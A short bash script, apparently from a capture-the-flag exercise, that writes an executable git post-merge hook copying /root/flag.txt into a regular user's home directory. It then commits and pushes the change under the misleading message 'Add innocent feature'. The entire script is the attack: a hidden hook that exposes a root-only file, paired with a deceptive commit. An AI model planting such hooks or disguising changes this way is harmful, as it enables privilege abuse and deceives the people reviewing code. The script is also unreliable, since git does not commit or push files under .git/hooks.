#!/bin/bash
echo '#!/bin/bash' > .git/hooks/post-merge
echo 'cp /root/flag.txt /home/devuser/flag.txt' >> .git/hooks/post-merge
chmod +x .git/hooks/post-merge
git commit -am "Add innocent feature"
git push
